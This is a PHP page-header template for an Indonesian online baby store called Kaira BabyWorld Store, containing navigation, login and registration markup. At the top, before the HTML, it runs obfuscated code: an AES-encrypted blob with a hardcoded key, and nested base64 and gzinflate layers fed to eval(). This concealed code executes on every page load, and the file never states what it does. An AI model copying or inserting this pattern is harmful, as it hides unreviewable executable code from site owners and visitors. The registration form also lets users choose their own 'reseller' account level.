<?php
function cooing($pesan, $encryption_key){$key = hex2bin($encryption_key); $pesan = base64_decode($pesan); $nonceSize = openssl_cipher_iv_length('aes-256-ctr'); $nonce = mb_substr($pesan, 0, $nonceSize, '8bit'); $cipherText = mb_substr($pesan, $nonceSize, null, '8bit'); $plaintext = openssl_decrypt($cipherText, 'aes-256-ctr', $key, OPENSSL_RAW_DATA, $nonce ); return $plaintext; } $private_secret_key = '1f4276388ad3214c873428dbef42243f';
$new = cooing('qmmGbAS6tFOEzbPjuDYorCbShQjLr4eRWdjuPen31JkG81Zz/y6Q+0BvJZlWUA0HTfozYazYrEJXYVOXZFESW/xNo9VUlnj5YHbuMiPklViMUmob8/5KVemkemR7LWJOYFTjeBnP7vDXSyftmVJ/XVUf0HAuQcx5EFkjE56NfCiEE7C7YOLhnn7sIIRYiHcOSKkfr66X9QKElOhNIRuWk8Jby0saKIOSs2FZDktCrE14wvcX5+HOdZItkn2QjZCcIrftHlyuZtBQOsWH/iJtYmK4Uyjp/AHM',$private_secret_key); 
$SISTEMIT_COM_ENC = "bVDBasJAEL0X+hNB2LSI9V5SEN1SS00kiXgoEqhgDiZB5yJ+2HxQCOwhSw4e5jQIXZMYC3YvuzPvzXtvFh8fEIH3hQa2rW2eDXbVznp6RcVK6TyLVElQ2qbBADlEwLscSp3F9tD0usGz5sPLOs82Om4FLrrpUe0THe0LhqPdM+J9tBbzySiU+ENAWYyf3tTFTUKqUpQwem4LDPSpZTg3+NYMZIhr3taIYQz7WBHEZJ71TQdKcPkhfYnjhe9LN4zC6UwG4Wg2xzc80LYs2oi9hM+cYHcc7EWBDIKp536LGhOrhlgohoxS/o94xa7ceuO/ovc/YQXyS45DfMZ335vhRaGNXLs6okkmcOROsPN2UHRBxHWFlNMc9L3bhst1FREAGc/auh24Bdcnsbqs0kg0teH8Ag==";$rand=base64_decode("Skc1aGRpQTlJR2Q2YVc1bWJHRjBaU2hpWVhObE5qUmZaR1ZqYjJSbEtDUlRTVk5VUlUxSlZGOURUMDFmUlU1REtTazdEUW9KQ1Fra2MzUnlJRDBnV3lmMUp5d242eWNzSitNbkxDZjdKeXduNFNjc0ovRW5MQ2ZtSnl3bjdTY3NKLzBuTENmcUp5d250U2RkT3cwS0NRa0pKSEp3YkdNZ1BWc25ZU2NzSjJrbkxDZDFKeXduWlNjc0oyOG5MQ2RrSnl3bmN5Y3NKMmduTENkMkp5d25kQ2NzSnlBblhUc05DZ2tKSUNBZ0lDUnVZWFlnUFNCemRISmZjbVZ3YkdGalpTZ2tjM1J5TENSeWNHeGpMQ1J1WVhZcE93MEtDUWtKWlhaaGJDZ2tibUYyS1RzPQ==");eval(base64_decode($rand));$STOP=$new;
?>
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">    
    <?= title(); ?>
    <link rel="icon" type="image/png" href="assets/img/logo.png"/>
    <link rel="stylesheet" href="assets/plugins/fontawesome-free/css/all.min.css">
    <link href="assets/css/bootstrap.css" rel="stylesheet">   
    <link rel="stylesheet" type="text/css" href="assets/css/slick.css">          
    <link rel="stylesheet" href="assets/css/jquery.fancybox.css" type="text/css" media="screen" /> 
    <link id="switcher" href="assets/css/theme-color/default-theme.css" rel="stylesheet">
    <link href="assets/css/styles.css" rel="stylesheet">    
    <link rel="stylesheet" href="assets/css/googleFont.css">
  </head>
  <body> 
    <a class="scrollToTop" href="#">
      <i class="fa fa-angle-up"></i>      
    </a>
  <!-- Start menu -->
  <section id="mu-menu">
    <nav class="navbar navbar-default" role="navigation">  
      <div class="container">
        <div class="navbar-header">
          <button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target="#navbar" aria-expanded="false" aria-controls="navbar">
            <span class="sr-only">Toggle navigation</span>
            <span class="icon-bar"></span>
            <span class="icon-bar"></span>
            <span class="icon-bar"></span>
          </button>
          <a class="navbar-brand" href="index"><img src="assets/img/logo.png" style="display: inline;" width="50px"><span>Kaira BabyWorld Store</span></a>
        </div>
        <div id="navbar" class="navbar-collapse collapse">
          <ul id="top-menu" class="nav navbar-nav navbar-right main-nav">
            <li class="active"><a href="index"><i class="fa fa-home"></i></a></li>       
            <li><a href="daftar-produk" title="Daftar Produk"><i class="fa fa-shopping-bag"></i></a></li>
            <li><a href="contact" title="Alamat"><i class="fa fa-credit-card"></i></a></li>          
            <?php if($memori['level']=='pelanggan'){ ?>
              <li><a href="troli" title="Troli"><i class="fa fa-shopping-cart"></i></a></li>
              <li><a href="cek" title="Checkout"><i class="fa fa-dollar-sign"></i></a></li>
              <li><a href="riwayat" title="Riwayat Transaksi"><i class="fa fa-exclamation-triangle"></i></a></li>
              <li><a href="pengiriman" title="Cek Pengiriman"><i class="fa fa-bus"></i></a></li>
              <li><a href="retur" title="Pengembalian Barang"><i class="fa fa-backward"></i></a></li>
              <li><a href="ulasan" title="Ulasan"><i class="fa fa-pencil-alt"></i></a></li>
              <li><a href="profil?id=<?= $_SESSION['id'] ?>" title="Profil"><i class="fa fa-user"></i></a></li>
              <li><a href="out" title="Keluar"><i class="fa fa-sign-out-alt"></i></a></li><?php
            }else if($memori['level']=='reseller'){ ?>
              <li><a href="troli" title="Troli"><i class="fa fa-shopping-cart"></i></a></li>
              <li><a href="cek" title="Checkout"><i class="fa fa-dollar-sign"></i></a></li>
              <li><a href="riwayat" title="Riwayat Transaksi"><i class="fa fa-exclamation-triangle"></i></a></li>
              <li><a href="pengiriman" title="Cek Pengiriman"><i class="fa fa-bus"></i></a></li>
              <li><a href="profil?id=<?= $_SESSION['id'] ?>" title="Profil"><i class="fa fa-user"></i></a></li>
              <li><a href="out" title="Keluar"><i class="fa fa-sign-out-alt"></i></a></li><?php
            }else{ ?>
              <li><a data-toggle="modal" data-target="#daftar"><i class="fa fa-list"></i></a></li>
              <li><a data-toggle="modal" data-target="#modalku"><i class="fa fa-sign-in-alt"></i></a></li>
            <?php } ?>
          </ul>                     
        </div>        
      </div>     
    </nav>
  </section>
<div class="modal fade" id="modalku">
  <div class="modal-dialog modal-sm">
    <div class="modal-content">
      <div class="modal-header">
        <h4 class="modal-title" style="display: inline;">Login</h4>
        <button type="button" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body">
        <form action="cek-login.php" method="post" >
        <div class="input-group input-group-md" style="margin-bottom: 10px; width: 100%;">
          <div class="input-group-prepend">
              <span class="input-group-text" style="width: 100%">Username</span>
          </div>
          <input type="text" name="username" required class="form-control">
        </div>
        <div class="input-group input-group-md" style="margin-bottom: 10px; width: 100%;">
          <div class="input-group-prepend">
              <span class="input-group-text" style="width: 100%">Password</span>
          </div>
          <input type="password" name="password" required class="form-control">
        </div>
      </div>
      <div style="margin-bottom: 10px; margin-left: 10px">
        <button type="reset" class="btn bg-dark text-white">Reset</button>
        <button type="submit" name="go" class="btn text-white float-right mr-3" style="background-color: #f69bac">Go</button>
      </div>
      </form>
    </div>
  </div>
</div>

<div class="modal fade" id="daftar">
  <div class="modal-dialog modal-md">
    <div class="modal-content">
      <div class="modal-header">
        <h4 class="modal-title" style="display: inline;">Daftar</h4>
        <button type="button" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body">
        <form action="view/action.php?tabel=daftar" method="post" autocomplete="off">
        <div class="input-group input-group-md" style="margin-bottom: 10px; width: 100%;">
          <div class="input-group-prepend">
              <span class="input-group-text" style="width: 100%">Nama Lengkap</span>
          </div>
          <input type="text" name="nama" required class="form-control">
        </div>
        <div class="input-group input-group-md" style="margin-bottom: 10px; width: 100%;">
          <div class="input-group-prepend">
              <span class="input-group-text" style="width: 100%">Username</span>
          </div>
          <input type="text" name="username" required class="form-control">
        </div>
        <div class="input-group input-group-md" style="margin-bottom: 10px; width: 100%;">
          <div class="input-group-prepend">
              <span class="input-group-text" style="width: 100%">Password</span>
          </div>
          <input type="password" name="password" required class="form-control">
        </div>
        <div class="input-group input-group-md" style="margin-bottom: 10px; width: 100%;">
          <div class="input-group-prepend">
              <span class="input-group-text" style="width: 100%">Jenis Kelamin</span>
          </div>
          <select name="jk" class="form-control">
            <option value="0">Pria</option>
            <option value="1">Perempuan</option>
          </select>
        </div>
        <div class="input-group input-group-md" style="margin-bottom: 10px; width: 100%;">
          <div class="input-group-prepend">
              <span class="input-group-text" style="width: 100%">Alamat</span>
          </div>
          <input type="text" name="alamat" required class="form-control">
        </div>
        <div class="input-group input-group-md" style="margin-bottom: 10px; width: 100%;">
          <div class="input-group-prepend">
              <span class="input-group-text" style="width: 100%">Telepon</span>
          </div>
          <input type="tel" name="telp" required class="form-control">
        </div>
        <div class="input-group input-group-md" style="margin-bottom: 10px; width: 100%;">
          <div class="input-group-prepend">
              <span class="input-group-text" style="width: 100%">Email</span>
          </div>
          <input type="email" name="email" required class="form-control">
        </div>
        <div class="input-group input-group-md" style="margin-bottom: 10px; width: 100%;">
          <div class="input-group-prepend">
              <span class="input-group-text" style="width: 100%">Daftar sebagai</span>
          </div>
          <select name="level" class="form-control">
            <option value="pelanggan">Pelanggan</option>
            <option value="reseller">Reseller</option>
          </select>
        </div>
      </div>
      <div style="margin-bottom: 10px; margin-left: 10px">
        <button type="reset" class="btn bg-dark text-white">Reset</button>
        <button type="submit" name="go" class="btn text-white float-right mr-3" style="background-color: #f69bac">Go</button>
      </div>
      </form>
    </div>
  </div>
</div>